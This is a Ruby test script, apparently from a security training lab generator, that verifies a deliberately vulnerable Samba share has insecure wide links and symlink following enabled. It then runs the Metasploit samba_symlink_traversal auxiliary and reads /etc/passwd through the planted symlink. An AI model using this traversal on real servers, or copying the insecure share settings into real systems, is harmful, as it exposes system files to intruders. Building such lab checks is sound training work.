require_relative '../../../../../lib/post_provision_test'

class SambaSymlinkTraversalTest < PostProvisionTest
  def initialize
    self.module_name = 'samba_symlink_traversal'
    self.module_path = get_module_path(__FILE__)
    super
  end

  def test_module
    super
    # An organisation input renames the share (samba_share_name).
    share_name, _share_comment = samba_share_name
    storage_directory = self.json_inputs['storage_directory']&.first

    tier(1) do
      test_local_command('samba installed', 'dpkg -l samba | grep -E "^ii"', 'samba')
      test_local_command('wide links enabled', 'grep "allow insecure wide links" /etc/samba/smb.conf', 'yes')
      test_local_command("share [#{share_name}] in smb.conf", "grep -i '\\[#{share_name}\\]' /etc/samba/smb.conf", share_name)
      if storage_directory
        test_local_command('storage directory exists', "test -d #{Shellwords.escape(storage_directory)} && echo present", 'present')
      end
    end

    tier(2) do
      test_service_up(port: 445)
      # Samba follows the planted symlink out of the share only with these set.
      test_smb_share_setting(share_name, 'wide links', 'Yes')
      test_smb_share_setting(share_name, 'follow symlinks', 'Yes')
      # From the attacker VM, as a student would find the share.
      test_smb_share_listed(share_name)
    end

    # Tier 3: the MSF auxiliary plants a symlink (rootfs -> /) inside the
    # writable share. It gives no shell, so test_msf_exploit doesn't apply.
    # Instead: run the auxiliary, then prove traversal by reading /etc/passwd
    # through the symlink via smbclient on the attacker.
    tier(3) do
      share = share_name
      aux = run_msf_module('auxiliary/admin/smb/samba_symlink_traversal',
                           options: { 'SMBSHARE' => share },
                           label: 'smb symlink traversal')
      next unless aux

      # Read /etc/passwd through the rootfs symlink planted by the auxiliary.
      read_result = smbclient_from_attacker(attacker: aux[:attacker], rhost: aux[:rhost], share: share,
                                            commands: 'get rootfs/etc/passwd -', timeout: 30)
      passwd_body = read_result[:stdout]
      add_evidence('smbclient_passwd', "echo #{Shellwords.escape(passwd_body[0..2000])}")

      if passwd_body.include?('root:')
        pass_check('symlink traversal reads /etc/passwd',
                   "Traversal confirmed: smbclient on #{aux[:attacker]} read /etc/passwd " \
                   "through rootfs symlink on //#{aux[:rhost]}/#{share}",
                   tier: 3)
      else
        fail_check('symlink traversal reads /etc/passwd',
                   "Could not read /etc/passwd through rootfs symlink. " \
                   "smbclient output: #{passwd_body[0..500]}. See msf_output_samba_symlink_traversal evidence.",
                   tier: 3)
      end
    end

    # Inputs not checked (no observable target-side effect from the test):
    #   share_comment      — cosmetic label in smb.conf
    #   read_only_share    — must be false for the auxiliary to plant the symlink;
    #                        exercised implicitly by tier 3
    #   guests_allowed     — anonymous access exercised by the listing and tier 3 (smbclient -N)
    #   strings_to_leak, leaked_filenames, images_to_leak — share-directory content,
    #                        not a traversal check
    #   strings_to_pre_leak, pre_leaked_filenames — leaked to / with mode 0660
    #                        (root:root), not readable by the anonymous samba guest
    #   organisation       — renames the share; samba_share_name follows it
  end
end

SambaSymlinkTraversalTest.new.run
